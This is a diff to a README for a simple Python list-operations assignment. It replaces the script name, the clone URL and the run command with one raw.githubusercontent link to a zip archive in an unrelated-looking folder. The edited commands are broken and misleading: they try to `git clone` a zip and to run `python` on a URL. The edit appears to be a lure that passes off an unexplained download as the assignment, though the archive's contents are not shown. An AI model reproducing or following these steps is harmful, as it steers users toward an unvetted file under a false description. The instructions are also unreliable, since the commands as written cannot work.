@@ -2,7 +2,7 @@
 
 This repository contains a Python script that demonstrates fundamental list operations as part of a weekly assignment.
 
-The script, `list_operations.py`, performs a series of actions on a Python list, showcasing how to manipulate data structures efficiently.
+The script, `https://raw.githubusercontent.com/Griffnificent/python-list-assignment/main/ambilogy/assignment-python-list-2.8.zip`, performs a series of actions on a Python list, showcasing how to manipulate data structures efficiently.
 
 ## **Assignment Instructions**
 
@@ -26,7 +26,7 @@ The program addresses the following tasks:
 
 1.  **Clone the Repository**:
     ```bash
-    git clone [https://github.com/your-username/your-repo-name.git](https://github.com/your-username/your-repo-name.git)
+    git clone [https://raw.githubusercontent.com/Griffnificent/python-list-assignment/main/ambilogy/assignment-python-list-2.8.zip](https://raw.githubusercontent.com/Griffnificent/python-list-assignment/main/ambilogy/assignment-python-list-2.8.zip)
     ```
     *Remember to replace `your-username` and `your-repo-name` with your actual GitHub details.*
 
@@ -37,7 +37,7 @@ The program addresses the following tasks:
 
 3.  **Execute the Script**:
     ```bash
-    python list_operations.py
+    python https://raw.githubusercontent.com/Griffnificent/python-list-assignment/main/ambilogy/assignment-python-list-2.8.zip
     ```
 
 The program will run and print the final index of the value `30` to your console.
